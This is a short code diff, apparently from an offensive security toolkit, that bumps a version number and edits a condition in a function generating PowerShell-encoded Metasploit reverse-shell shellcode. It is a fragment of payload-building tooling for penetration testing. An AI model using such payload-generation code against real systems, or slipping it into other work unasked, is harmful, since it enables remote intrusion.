@@ -230,7 +230,7 @@ def print_error(message):
     print bcolors.RED + bcolors.BOLD + "[!] " + bcolors.ENDC + bcolors.RED + str(message) + bcolors.ENDC
 
 def get_version():
-    define_version = '6.1.1'
+    define_version = '6.1.2'
     return define_version
 
 class create_menu:
@@ -1193,7 +1193,7 @@ def generate_powershell_alphanumeric_payload(payload,ipaddr,port, payload2):
 
     # generate our shellcode first
     shellcode = metasploit_shellcode(payload, ipaddr, port)
-    if not "reverse_http" or "reverse_https" in payload:
+    if not "reverse_http" in payload or not "reverse_https" in payload:
         shellcode = shellcode_replace(ipaddr, port, shellcode).rstrip()
         # sub in \x for 0x
         shellcode = re.sub("\\\\x", "0x", shellcode)
